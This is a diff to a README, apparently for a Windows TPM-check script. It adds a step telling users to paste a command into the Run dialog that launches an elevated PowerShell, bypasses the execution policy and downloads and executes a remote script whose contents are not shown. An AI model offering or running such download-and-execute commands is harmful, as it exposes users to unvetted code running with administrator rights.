@@ -6,7 +6,7 @@ Run this script in PowerShell as Administrator to find out whether your Windows 
     - Press Win + R on your keyboard to open the Run dialog.
 2. Copy and paste the following command into the Run dialog:
     ```powershell
-    /*command will be here*/
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EZTaylor/win-tpm-check/refs/heads/main/tpm-check.ps1')" -Verb RunAs
     ```
 3. Run the command:
     - Press Enter to execute the command.
